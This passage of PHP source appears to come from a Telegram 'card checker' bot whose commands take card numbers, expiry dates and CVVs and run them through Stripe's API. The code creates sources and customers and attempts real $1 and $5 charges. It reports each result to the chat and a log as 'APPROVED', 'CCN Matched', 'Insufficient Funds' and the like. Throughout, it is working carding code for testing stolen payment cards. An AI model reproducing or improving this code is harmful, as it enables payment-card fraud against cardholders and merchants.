                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&customer='.$tok2.'');
                  $result3 = curl_exec($ch);
                  $msg3 = Getstr($result3,'"message": "','"');
                  $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
                  $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
                  $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
                  if(strpos($result3, '"status": "succeeded"' )) {
                  sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED 1$ ✅</b>\n<b>Response -» CHARGED 1$ SUCCESSFULLY ✅</b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n<b>Risk score -» $rsk</b>\n<b> Risk Level -» $rsklv</b>\n<b> RECEPIT URL -» $rcp</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  sendLog ($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED 1$ ✅</b>\n<b>Response -» CHARGED 1$ SUCCESSFULLY ✅</b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n<b>Risk score -» $rsk</b>\n<b> Risk Level -» $rsklv</b>\n<b> RECEPIT URL -» $rcp</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  return;
                  }
                  if(strpos($result3, "insufficient_funds" )) {
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» Insufficient Funds </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, "card_error_Chargeentication_required")) || (strpos($result2, "card_error_Chargeentication_required"))){ sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APROVED ⚠️</b>\n<b>Response -» 3D Card </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  }
                  if(strpos($result3,"Your card's security code is incorrect.")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ⚠️</b>\n<b>Response -» CCN Matched </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, "fraudulent"))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» REJECTED ⛔</b>\n<b>Response -» Fraudulent </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, "expired_card"))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» expired_card </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, '"decline_code": "generic_decline"'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Generic Declined </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                      }
                    if ((strpos($result3, "do_not_honor"))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, 'rate_limit'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                      
                    if ((strpos($result3, "Your card was declined."))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» No Account </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, ' "message": "testmode_charges_only"'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, 'transaction_not_allowed'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Your card does not support this type of purchase. </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, 'invalid_number'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» NO ACCOUNT ❌</b>\n<b>Response -» invalid_number </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                  else {
                    sendMessage($chatId, "<b>SERVER ERROR</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                    sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
                    sendLog($chatId, "<b>BUG REPORTED /chg</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                    }
                  }
  //==================[chf Command]==================//
  elseif (strpos($message, "/chf") === 0){
    $message = substr($message, 4);
    $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
    $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
                  $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  'Host: lookup.binlist.net',
                  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                  $fim = curl_exec($ch);
                  $bank = GetStr($fim, '"bank":{"name":"', '"');
                  $name = GetStr($fim, '"name":"', '"');
                  $brand = GetStr($fim, '"brand":"', '"');
                  $country = GetStr($fim, '"country":{"name":"', '"');
                  $emoji = GetStr($fim, '"emoji":"', '"');
                  $scheme = GetStr($fim, '"scheme":"', '"');
                  $type = GetStr($fim, '"type":"', '"');
                  if(strpos($fim, '"type":"credit"') !== false){
                  $bin = 'Credit';
                  }else{
                  $bin = 'Debit';
                  };
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_USERPWD, $pk. ':' . '');
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
                  $result1 = curl_exec($ch);
                  $tok1 = Getstr($result1,'"id": "','"');
                  $msg1 = Getstr($result1,'"message": "','"');
                  if(strpos($result1, "card_error")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "card_declined")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "rate_limit")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "invalid_cvc")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "sources_required_type_param")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "testmode_charges_only")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, 'invalid_expiry_year'))){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_year </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, 'invalid_expiry_month'))){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_month </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, 'incorrect_number'))){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» INVALID CARD ❌</b>\n<b>Response -» Incorrect number </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
                  $result2 = curl_exec($ch);
                  $tok2 = Getstr($result2,'"id": "','"');
                  $msg2 = Getstr($result2,'"message": "','"');
                  if(strpos($result2, "card_error")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "invalid_cvc")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "sources_required_type_param")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
    
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=500&currency=usd&customer='.$tok2.'');
                  $result3 = curl_exec($ch);
                  $msg3 = Getstr($result3,'"message": "','"');
                  $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
                  $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
                  $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
                  if(strpos($result3, '"status": "succeeded"' )) {
                  sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED 5$ ✅</b>\n<b>Response -» CHARGED 5$ SUCCESSFULLY ✅</b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n<b>Risk score -» $rsk</b>\n<b> Risk Level -» $rsklv</b>\n<b> RECEPIT URL -» $rcp</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  sendLog ($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED 5$ ✅</b>\n<b>Response -» CHARGED 5$ SUCCESSFULLY ✅</b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n<b>Risk score -» $rsk</b>\n<b> Risk Level -» $rsklv</b>\n<b> RECEPIT URL -» $rcp</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  return;
                  }
                  if(strpos($result3, "insufficient_funds" )) {
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» Insufficient Funds </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, "card_error_Chargeentication_required")) || (strpos($result2, "card_error_Chargeentication_required"))){ sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APROVED ⚠️</b>\n<b>Response -» 3D Card </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  }
                  if(strpos($result3,"Your card's security code is incorrect.")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ⚠️</b>\n<b>Response -» CCN Matched </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, "fraudulent"))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» REJECTED ⛔</b>\n<b>Response -» Fraudulent </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, "expired_card"))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» expired_card </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, '"decline_code": "generic_decline"'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Generic Declined </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                      }
                    if ((strpos($result3, "do_not_honor"))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, 'rate_limit'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                      
                    if ((strpos($result3, "Your card was declined."))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» No Account </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, ' "message": "testmode_charges_only"'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, 'transaction_not_allowed'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Your card does not support this type of purchase. </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, 'invalid_number'))){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» NO ACCOUNT ❌</b>\n<b>Response -» invalid_number </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    else {
